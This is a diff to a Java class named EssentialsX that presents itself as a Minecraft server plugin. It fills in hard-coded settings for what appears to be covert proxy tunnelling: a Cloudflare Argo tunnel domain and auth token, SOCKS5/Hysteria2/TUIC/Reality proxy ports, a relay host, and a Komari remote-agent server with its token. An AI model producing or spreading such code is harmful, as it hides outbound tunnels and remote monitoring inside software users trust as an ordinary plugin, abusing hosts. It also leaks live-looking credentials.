@@ -92,24 +92,24 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "");
-        env.put("ARGO_AUTH", "");
-        env.put("S5_PORT", "");
-        env.put("HY2_PORT", "");
-        env.put("TUIC_PORT", "");
+        env.put("ARGO_DOMAIN", "mcserverhostsg.liuping.ccwu.cc");
+        env.put("ARGO_AUTH", "eyJhIjoiNDQ3MzQxNGZkNDc5Y2E1MmZiYTZjYjZkMWI5NGQ1NmMiLCJ0IjoiMTQ3ZDAwZTktM2Q3NC00NzgxLTlhNDgtZTNlMTFhNTViNTgyIiwicyI6Ik5HSXpOemswWWpFdFpXRTBNUzAwWm1ZeUxXRTNNRGd0TkRZMU9EY3dORE0yTkRJNCJ9");
+        env.put("S5_PORT", "14895");
+        env.put("HY2_PORT", "14895");
+        env.put("TUIC_PORT", "14497");
         env.put("ANYTLS_PORT", "");
-        env.put("REALITY_PORT", "");
+        env.put("REALITY_PORT", "14497");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "");
         env.put("BOT_TOKEN", "");
-        env.put("CFIP", "spring.io");
+        env.put("CFIP", "youxuan.cf.090227.xyz");
         env.put("CFPORT", "443");
         env.put("NAME", "");
         env.put("DISABLE_ARGO", "false");
         // ---- Komari Agent 默认值 ----
-        env.put("KOMARI_SERVER", "");
-        env.put("KOMARI_TOKEN", "");
+        env.put("KOMARI_SERVER", "https://komari.liuping.ccwu.cc");
+        env.put("KOMARI_TOKEN", "5joGsAiUWIJKavlazOHoYm");
         
         // Load from system environment variables
         for (String var : ALL_ENV_VARS) {
